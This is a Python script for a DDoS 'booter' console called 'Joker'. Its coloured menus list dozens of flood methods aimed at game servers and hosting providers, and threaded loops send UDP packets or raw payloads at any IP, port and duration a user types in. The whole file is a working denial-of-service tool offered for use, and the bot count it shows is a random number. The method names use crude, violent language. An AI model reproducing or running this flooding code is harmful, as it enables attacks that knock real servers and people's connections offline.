#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "desyn"

methods = """
\033[35m╔════════════════════════╗
\033[35m║ \033[36m---- \033[32mMethods List! \033[36m--- \033[35m╚═════════╗
\033[35m║ \033[93mgen3   \033[36m> \033[32mShows Gen3 Methods!     \033[35m║
\033[35m║ \033[32mgen2   \033[36m> \033[32mShows Gen2 Methods!     \033[35m║
\033[35m║ \033[32mlayer4 \033[36m> \033[32mShows Layer 4 Methods!  \033[35m║
\033[35m║ \033[32mlayer7 \033[36m> \033[32mShows Layer 7 Methods!  \033[35m║
\033[35m║ \033[32mprivate\033[36m> \033[32mShows Private Methods!  \033[35m║
\033[35m║ \033[32mraw    \033[36m> \033[32mShows Raw Methods!      \033[35m║
\033[35m║ \033[32mmore   \033[36m> \033[32mShows More Methods!     \033[35m║
\033[35m╚══════════════════════════════════╝
"""

raw = """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32mudpraw \033[36m- \033[32mRaw UDP Flood \033[35m  ║ \033[32mhexraw \033[36m- \033[32mRaw HEX Flood \033[35m    ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mtcpraw \033[36m- \033[32mRaw TCP Flood \033[35m║ ║ \033[32mvseraw \033[36m- \033[32mRaw VSE Flood \033[35m  ║
\033[35m             ║ \033[32mstdraw \033[36m- \033[32mRaw STD Flood \033[35m║ ║ \033[32msynraw \033[36m- \033[32mRaw SYN Flood \033[35m  ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32movhslav \033[36m- \033[32mSlavic Flood \033[35m  ║ \033[32miotv1 \033[36m- \033[32mCustom Method!  \033[35m   ║
\033[35m            ║ \033[32mcpukill \033[36m- \033[32mCpu Rape Flood\033[35m ║ \033[32miotv2 \033[36m- \033[32mCustom Method!  \033[35m   ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mfivemkill \033[36m- \033[32mFivem Kill \033[35m║ ║ \033[32miotv3 \033[36m-\033[32m Custom Method!  \033[35m ║
\033[35m             ║ \033[32micmprape  \033[36m- \033[32mICMP Rape  \033[35m║ ║ \033[32mssdp  \033[36m-\033[32m Amped SSDP      \033[35m ║
\033[35m             ║ \033[32mtcprape \033[36m- \033[32mRaping TCP   \033[35m║ ║ \033[32marknull \033[36m- \033[32mArk Method    \033[35m ║
\033[35m             ║ \033[32mnforape \033[36m- \033[32mNfo Method   \033[35m║ ║ \033[32m2kdown  \033[36m- \033[32mNBA 2K Flood  \033[35m ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32mhomeslap    \033[36m. \033[32mr6kill     \033[35m║ \033[32mfivemtcp  \033[36m. \033[32mnfokill       \033[35m ║
\033[35m            ║ \033[32mark255      \033[36m. \033[32marklift    \033[35m║ \033[32mhotspot   \033[36m. \033[32mvpn           \033[35m ║
\033[35m            ║ \033[32mhydrakiller \033[36m. \033[32markdown    \033[35m║ \033[32mnfonull   \033[36m. \033[32mdhcp          \033[35m ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32movhnat    \033[36m. \033[32movhamp     \033[35m║ ║ \033[32movhwdz    \033[36m. \033[32movhx         \033[35m║
\033[35m             ║ \033[32mnfodrop   \033[36m. \033[32mnfocrush   \033[35m║ ║ \033[32mnfodown   \033[36m. \033[32mnfox         \033[35m║
\033[35m             ║ \033[32mudprape   \033[36m. \033[32mudprapev3  \033[35m║ ║ \033[32mfortnite  \033[36m. \033[32mfortnitev2   \033[35m║
\033[35m             ║ \033[32mudprapev2 \033[36m. \033[32mudpbypass  \033[35m║ ║ \033[32mgreeth    \033[36m. \033[32mtelnet       \033[35m║
\033[35m             ║ \033[32mfivemv2   \033[36m. \033[32mr6drop     \033[35m║ ║\033[32m r6freeze  \033[36m. \033[32mkillall      \033[35m║
\033[35m             ║ \033[32m2krape    \033[36m. \033[32mfallguys   \033[35m║ ║ \033[32movhdown   \033[36m. \033[32movhkill      \033[35m║
\033[35m             ║ \033[32mfivemrape \033[36m. \033[32mfivemdown  \033[35m║ ║ \033[32mfivemv1   \033[36m. \033[32mfivemslump   \033[35m║
\033[35m             ║ \033[32mkillallv2 \033[36m. \033[32mkillallv3  \033[35m║ ║ \033[32mpowerslap \033[36m. \033[32mrapecom      \033[35m║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""


layer4 = """\033[35m
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║  \033[32mudp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[32mvse \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ║  \033[32mtcp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[32mack \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mstd \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[32mdns \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m             ║ \033[32msyn \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[32movh \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m             ║\033[36m- - - - - - - \033[93mhomerape \033[32m[IP] [TIME] [PORT] \033[36m- - - - - -\033[35m║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - - Joker vF By \033[36m@iotnet \033[35m- - - - - - -║
\033[35m                ║\033[32m  - - - Type \033[36mhelp\033[35m to see the Help Menu - - - - ║
\033[35m                ╚═══════════════════════════════════════════════╝


\033[35m                    ╔════════════════════════════════════════╗
\033[35m                    ║\033[32m- -Connection Has Been \033[36m(ESTABILISHED)- -\033[35m║
\033[35m                    ╚════════════════════════════════════════╝
"""

cookie = open(".joker_cookie","w+")

fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1000000000000
	aid += 1000000000000
	tattacks += 1000000000000
	running += 1000000000000
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1000000000000
	iaid -= 1000000000000
	aid -= 1000000000000


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1000000000000
	running += 1000000000000
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1000000000000
	running -= 1000000000000

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(32500,41500))
		sys.stdout.write("\x1b]2;Joker. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[32m[\033[35m{}\033[32m@Joker]\033[36m$ \033[96m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "?":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "layer4":
			os.system ("clear")
			print (layer4)
			main()
		elif sinput == "method":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "private":
			os.system ("clear")
			print (private)
			main()
		elif sinput == "gen3":
			os.system ("clear")
			print (gen3)
			main()
		elif sinput == "raw":
			os.system ("clear")
			print (raw)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "std":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
